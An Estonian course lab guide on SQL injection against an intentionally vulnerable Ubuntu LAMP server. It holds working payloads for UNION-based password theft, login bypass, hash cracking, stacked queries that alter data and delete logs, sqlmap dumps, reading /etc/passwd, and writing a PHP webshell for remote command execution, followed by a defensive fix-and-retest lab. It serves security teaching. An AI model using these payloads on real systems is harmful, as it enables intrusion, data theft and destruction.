# SQL-süstimise labor — serveri versioonid ja laboriülesanded

**Kursus:** Küberturvalisus (täiskasvanud IT-õppijad)
**Lisamaterjal failile:** `PAIGALDUS.md`

> ⚠️ **AINULT isoleeritud laborikeskkonnas** (Proxmox SDN VNet, ligipääsuta
> väljastpoolt). Ründamist tohib harjutada ainult selles laboris.

---

## 1. Milline PHP / Apache / MySQL versioon peab olema?

**Kõige olulisem õppepunkt:** haavatavus tuleb siin **koodist ja seadistusest**,
mitte tarkvaraversioonist. Labor töötab igal mõistlikul kaasaegsel versioonil.
Miinimumnõuded:

- **PHP 7.2 või uuem** koos `mysqli`-laiendiga (pakett `php-mysqli`). `mysqli`
  olemas kõigis PHP 7.x ja 8.x versioonides, sh funktsioon `multi_query()`, mida
  `otsing.php` manipuleerimise demoks kasutab.
- **Apache 2.4 või uuem** koos mooduliga `libapache2-mod-php`.
- **MySQL 5.7+ VÕI MariaDB 10.x+** (Debian/Ubuntu vaikevalik on MariaDB, mis on
  MySQL-iga ühilduv).

Ubuntu LTS-väljaannete **vaikeversioonid** (apt-ist, ilma lisarepodeta):

| Ubuntu Server | PHP | Apache | MySQL | MariaDB |
|---------------|-----|--------|-------|---------|
| 18.04 LTS | 7.2 | 2.4.29 | 5.7 | 10.1 |
| 20.04 LTS | 7.4 | 2.4.41 | 8.0 | 10.3 |
| 22.04 LTS | 8.1 | 2.4.52 | 8.0 | 10.6 |
| 24.04 LTS | 8.3 | 2.4.58 | 8.0 | 10.11 |

**Soovitus:**
- **Vaikevalik laborile: Ubuntu Server 22.04 LTS** — stabiilne, hästi toetatud,
  PHP 8.1 + MariaDB 10.6. Kõik 7 laborit töötavad muutmata kujul.
- **"Vanem/haavatavam" variant: Ubuntu 18.04 LTS** (PHP 7.2, MySQL 5.7) — kui tahad
  näidata vananenud komponente ja nende teadaolevaid CVE-sid. Pane tähele, et 18.04
  on jõudnud standardtoe lõppu, mis on iseenesest hea õppenäide "miks aegunud
  serverit mitte kasutada".

**Versiooni kontroll serveris:**

```bash
php -v          # PHP versioon
apache2 -v      # Apache versioon
mysql --version # MySQL/MariaDB versioon
```

**Mõisted:** *LTS* = *Long Term Support* (pikaajaline tugi). *CVE* = *Common
Vulnerabilities and Exposures* — avalik teadaolevate turvaaukude kataloog.

---

## 2. Haavatava Ubuntu serveri seadistamine

Seadistamine käib **kahes sammus** (mõlemad ohvermasinas, juurõigustes):

```bash
# 1) Paigalda LAMP + veebileht + andmebaas
sudo bash paigaldus.sh

# 2) Tee server tahtlikult nõrgaks (veateated, failioperatsioonid)
sudo bash haavatav_server.sh
```

**Mida `haavatav_server.sh` sisse lülitab ja miks see oluline on:**

| Seadistus | Tavaväärtus (turvaline) | Laboris (haavatav) | Mida võimaldab |
|-----------|-------------------------|---------------------|----------------|
| `display_errors` (PHP) | `Off` | `On` | Veapõhine (error-based) süstimine — Labor 2/osa |
| `secure_file_priv` (MySQL) | kataloogile piiratud | tühi (kõikjale) | `LOAD_FILE` ja `INTO OUTFILE` — Labor 7 |
| `local_infile` | `0` | `1` | Failide lugemine andmebaasi |
| `FILE`-õigus veebikasutajal | puudub | antud | Serveri failide lugemine/kirjutamine SQLi kaudu |
| `/var/www/html/upload` õigused | 755 | 777 | Webshelli kirjutamine (SQLi → RCE) |

**Mõisted:** *RCE* = *Remote Code Execution* (kaugkäsu täitmine) — kõige raskem
tagajärg, kus ründaja saab serveris käske jooksutada. *Webshell* = veebi kaudu
käske täitev skript, mille ründaja serverisse istutab.

Pärast seadistamist ava Kalist: `http://<ip>/index.php`. **`<ip>`** = ohvermasina
IP (leiad serveris käsuga `hostname -I`).

---

## 3. Laboriülesanded (sammsammult)

Ründajamasin on **Kali Linux**, sihtmärk **Ubuntu server**. Asenda kõikjal `<ip>`.

> **Nõuanne URL-ide kohta.** Brauseri aadressiribal muudab brauser tühiku ise
> `%20`-ks. `curl`-i puhul pane URL **ülakomadesse** ja kodeeri erimärgid:
> tühik = `%20`, `'` = `%27`, `#` = `%23`.

---

### Labor 1 — Luure ja haavatavuse tuvastamine

**Eesmärk:** leida süstitav sisendpunkt ja tõestada, et see on haavatav.
**Raskusaste:** algaja.

**Sammud:**
1. Ava Kalis brauser: `http://<ip>/index.php`. Pane tähele toodete linke kujul
   `toode.php?id=1`.
2. Ava tavaline päring: `http://<ip>/toode.php?id=1` → kuvatakse üks toode.
3. **Testi ülakomaga** (klassikaline SQLi test):
   `http://<ip>/toode.php?id=1'`
   Oodatav: andmebaasi **veateade** (*You have an error in your SQL syntax...*) →
   sisend jõuab otse päringusse.
4. **Testi tõeväärtusega:**
   - `http://<ip>/toode.php?id=1 AND 1=1` → toode kuvatakse (tõene)
   - `http://<ip>/toode.php?id=1 AND 1=2` → toodet ei kuvata (väär)
5. **Kinnita `OR 1=1`-ga:**
   `http://<ip>/toode.php?id=1 OR 1=1` → kuvatakse **kõik** tooted.

**Oodatav tulemus:** oled tõestanud, et `id` on haavatav ja leht kuvab päringu.
**Kontrollküsimused:** Miks ülakoma tekitab vea? Mille poolest erineb `AND 1=2`
vastus `AND 1=1`-st ja mida see ründajale ütleb?

---

### Labor 2 — UNION-põhine andmeleke (kasutajate ja paroolide vargus)

**Eesmärk:** lugeda `tooted`-päringu kaudu välja `kasutajad`-tabel.
**Raskusaste:** algaja–keskmine.

**Sammud:**
1. **Leia veergude arv** `ORDER BY`-ga:
   - `http://<ip>/toode.php?id=1 ORDER BY 5` → töötab
   - `http://<ip>/toode.php?id=1 ORDER BY 6` → viga *Unknown column '6'*
   Järeldus: päring tagastab **5 veergu**.
2. **Leia nähtavad veerud** (prooviväärtustega):
   `http://<ip>/toode.php?id=-1 UNION SELECT 1,2,3,4,5`
   Vaata, millised numbrid lehel kuvatakse (nimi- ja kirjelduse kohale, st 2 ja 3).
3. **Loe andmebaasi nimi ja versioon:**
   `http://<ip>/toode.php?id=-1 UNION SELECT 1,database(),version(),4,5`
4. **Loe kasutajad ja paroolid:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,kasutaja,parool,roll,5 FROM kasutajad
   ```
   curl:
   ```bash
   curl "http://<ip>/toode.php?id=-1%20UNION%20SELECT%201,kasutaja,parool,roll,5%20FROM%20kasutajad"
   ```

**Oodatav tulemus:** tootekaartidel ilmuvad kasutajanimed ja paroolid
(nt `admin / SuperSalajane2019!`).
**Kontrollküsimused:** Miks `id=-1`? Miks peab veergude arv täpselt klappima?

---

### Labor 3 — Andmebaasi struktuuri kaardistamine (`information_schema`)

**Eesmärk:** avastada tabelid ja veerud, kui neid ei teata ette.
**Raskusaste:** keskmine.

**Sammud:**
1. **Kõik tabelid praeguses andmebaasis:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()
   ```
2. **Tabeli `kasutajad` veerud:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='kasutajad'
   ```
3. **Mitu kirjet mõnes tabelis** (`GROUP_CONCAT` ühendab mitu väärtust üheks):
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,GROUP_CONCAT(kasutaja SEPARATOR ', '),3,4,5 FROM kasutajad
   ```

**Oodatav tulemus:** nimekiri tabelitest (`kasutajad`, `tooted`, `logid`) ja
`kasutajad`-tabeli veergudest.
**Kontrollküsimused:** Mis on `information_schema` ja miks on see ründaja jaoks
"kaart"? Mida teeb `GROUP_CONCAT`?

---

### Labor 4 — Autentimisest möödahiilimine ja paroolide murdmine

**Eesmärk:** logida sisse ilma paroolita ning murda väljaloetud räsid.
**Raskusaste:** keskmine.

**Sammud:**
1. Ava `http://<ip>/login.php`.
2. **Login bypass kommentaariga:**
   - Kasutajanimi: `admin' -- ` (tühik kriipsude järel kohustuslik!)
   - Parool: `xxx`
   Oodatav: "Sisselogimine õnnestus! Tere, admin".
3. **Login bypass tautoloogiaga:**
   - Kasutajanimi: `' OR '1'='1' -- `
   - Parool: `xxx`
4. **Murra Labor 2-st saadud MD5-räsid** (Kalis):
   ```bash
   # Salvesta räsi faili
   echo '827ccb0eea8a706c4c34a16891f84e7b' > hash.txt

   # rockyou sõnastik (vajadusel paki lahti)
   sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null

   # Murra hashcat-iga (-m 0 = MD5)
   hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

   # VÕI john-iga
   john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   ```

**Oodatav tulemus:** sisse logitud admininana; MD5-räsi `827ccb0e...` murtud →
parool `12345`.
**Kontrollküsimused:** Miks `--` parooli kontrolli välja lülitab? Miks on MD5
paroolide hoidmiseks ohtlik ja mida kasutada selle asemel?

---

### Labor 5 — Andmete manipuleerimine (stacked queries)

**Eesmärk:** mitte ainult lugeda, vaid **muuta, kustutada ja lisada** andmeid.
**Raskusaste:** keskmine.
**Leht:** `otsing.php` (kasutab `multi_query`-t, mis lubab mitu lauset korraga).

**Sammud:**
1. Tavaline otsing: `http://<ip>/otsing.php?q=klaviatuur` → leiab toote.
2. **Nulli kõik hinnad:**
   ```
   http://<ip>/otsing.php?q=x'; UPDATE tooted SET hind=0; -- 
   ```
   Kontrolli `http://<ip>/index.php` → hinnad on 0 €.
3. **Lisa endale admin-konto:**
   ```
   http://<ip>/otsing.php?q=x'; INSERT INTO kasutajad (kasutaja,parool,roll) VALUES ('hacker','123','admin'); -- 
   ```
4. **Kustuta logid (jälgede hävitamine):**
   ```
   http://<ip>/otsing.php?q=x'; DELETE FROM logid; -- 
   ```
5. **Kontrolli tulemust andmebaasist** (serveris):
   ```bash
   sudo mysql -e "SELECT * FROM pood.tooted; SELECT * FROM pood.kasutajad; SELECT * FROM pood.logid;"
   ```

**Oodatav tulemus:** hinnad nullis, uus kasutaja `hacker`, logid tühjad.
**Kontrollküsimused:** Miks `toode.php`-s (mis kasutab `mysqli_query`-t) stacked
query EI tööta, aga `otsing.php`-s (mis kasutab `multi_query`-t) töötab? Mida see
ütleb `multi_query` kasutamise kohta?

---

### Labor 6 — Pime süstimine ja automatiseeritud rünnak (`sqlmap`)

**Eesmärk:** andmete väljavõtmine, kui leht tulemust ei kuva; automatiseerimine.
**Raskusaste:** keskmine–raske.

**Sammud:**
1. **Tõeväärtuspõhine (boolean-based) pime test:**
   - `http://<ip>/toode.php?id=1 AND 1=1` → toode kuvatakse
   - `http://<ip>/toode.php?id=1 AND 1=2` → ei kuvata
   Nii saab ründaja küsida "jah/ei" küsimusi, nt: kas admini parooli esimene täht
   on 'S'?
   ```
   http://<ip>/toode.php?id=1 AND (SELECT SUBSTRING(parool,1,1) FROM kasutajad WHERE kasutaja='admin')='S'
   ```
2. **Ajapõhine (time-based) pime test:**
   `http://<ip>/toode.php?id=1 AND SLEEP(5)` → kui vastus tuleb 5 s hiljem, on
   haavatavus kinnitatud.
3. **Automatiseeri `sqlmap`-iga (Kalis):**
   ```bash
   # Tuvasta ja loetle andmebaasid
   sqlmap -u "http://<ip>/toode.php?id=1" --batch --dbs

   # Loetle tabelid andmebaasis "pood"
   sqlmap -u "http://<ip>/toode.php?id=1" --batch -D pood --tables

   # Dumpi tabel "kasutajad" (sqlmap proovib ka räsisid murda)
   sqlmap -u "http://<ip>/toode.php?id=1" --batch -D pood -T kasutajad --dump
   ```

**Oodatav tulemus:** `sqlmap` tuvastab haavatavuse tüübid ja tõmbab `kasutajad`-
tabeli automaatselt välja.
**Kontrollküsimused:** Mis vahe on pimedal ja UNION-süstimisel? Miks on automaat-
tööriist nii ohtlik kaitsetu lehe vastu?

---

### Labor 7 (edasijõudnutele) — Failide lugemine ja webshell (SQLi → RCE)

**Eesmärk:** näidata kõige raskemat tagajärge — koodi täitmine serveris.
**Raskusaste:** raske. **Eeldus:** `haavatav_server.sh` on käivitatud.

**Sammud:**
1. **Loe serveri fail `/etc/passwd` andmebaasi kaudu:**
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5
   ```
   Oodatav: tootekaardil kuvatakse `/etc/passwd` sisu.
2. **Kirjuta webshell veebikausta** (`INTO OUTFILE`):
   ```
   http://<ip>/toode.php?id=-1 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/upload/shell.php'
   ```
   curl-iga (erimärgid kodeeritud):
   ```bash
   curl "http://<ip>/toode.php?id=-1%20UNION%20SELECT%201,%27%3C%3Fphp%20system(%24_GET%5B%22cmd%22%5D)%3B%20%3F%3E%27,3,4,5%20INTO%20OUTFILE%20%27/var/www/html/upload/shell.php%27"
   ```
3. **Täida käske webshelli kaudu:**
   - `http://<ip>/upload/shell.php?cmd=id`
   - `http://<ip>/upload/shell.php?cmd=uname -a`
   - `http://<ip>/upload/shell.php?cmd=cat /etc/passwd`

**Oodatav tulemus:** brauseris kuvatakse käskude väljund → ründaja täidab serveris
suvalisi käske.
**Kontrollküsimused:** Milliste **kolme** väärseadistuse koostoime selle võimalikuks
tegi (`FILE`-õigus, `secure_file_priv`, kirjutatav kaust)? Kuidas iga neist ära
hoida?

---

### Labor 8 — Kaitse ja uuesti testimine

**Eesmärk:** parandada haavatavus ja tõestada, et rünnak enam ei tööta.
**Raskusaste:** keskmine.

**Sammud:**
1. Ava võrdluseks `http://<ip>/toode_turvaline.php?id=1` → töötab normaalselt.
2. **Proovi sama rünnakut mis Labor 1–2:**
   - `http://<ip>/toode_turvaline.php?id=1 OR 1=1` → kuvatakse ainult 1 toode (rünnak nurjub)
   - `http://<ip>/toode_turvaline.php?id=-1 UNION SELECT 1,kasutaja,parool,roll,5 FROM kasutajad` → tühi tulemus
3. **Võrdle koodi** failides `toode.php` ja `toode_turvaline.php`. Pane kirja
   erinevus (prepared statement + `bind_param` + `(int)`-teisendus).
4. **Paranda ise** `login.php` ja `otsing.php`: asenda stringide liitmine
   ettevalmistatud päringutega; `otsing.php`-s asenda `multi_query` tavalise
   `query`-ga.
5. **Tugevda serverit tagasi:** sea `display_errors = Off`, taasta
   `secure_file_priv`, võta ära `FILE`-õigus, sea upload-kaust 755.

**Oodatav tulemus:** parandatud lehtede vastu rünnakud ei tööta.
**Kontrollküsimused:** Miks prepared statement rünnaku peatab? Nimeta kolm
kaitsekihti (kood, andmebaasi õigused, serveri seadistus).

---

## 4. Kokkuvõttev hindamine (soovitus)

| Osa | Kaal |
|-----|------|
| Laborid 1–6 teostatud, ekraanipildid + payload'id | 50% |
| Labor 7 (edasijõudnutele) | 10% |
| Labor 8: parandatud kood töötab | 25% |
| Analüüs: ohtlikem haavatavus + kaitsemeetmed | 15% |
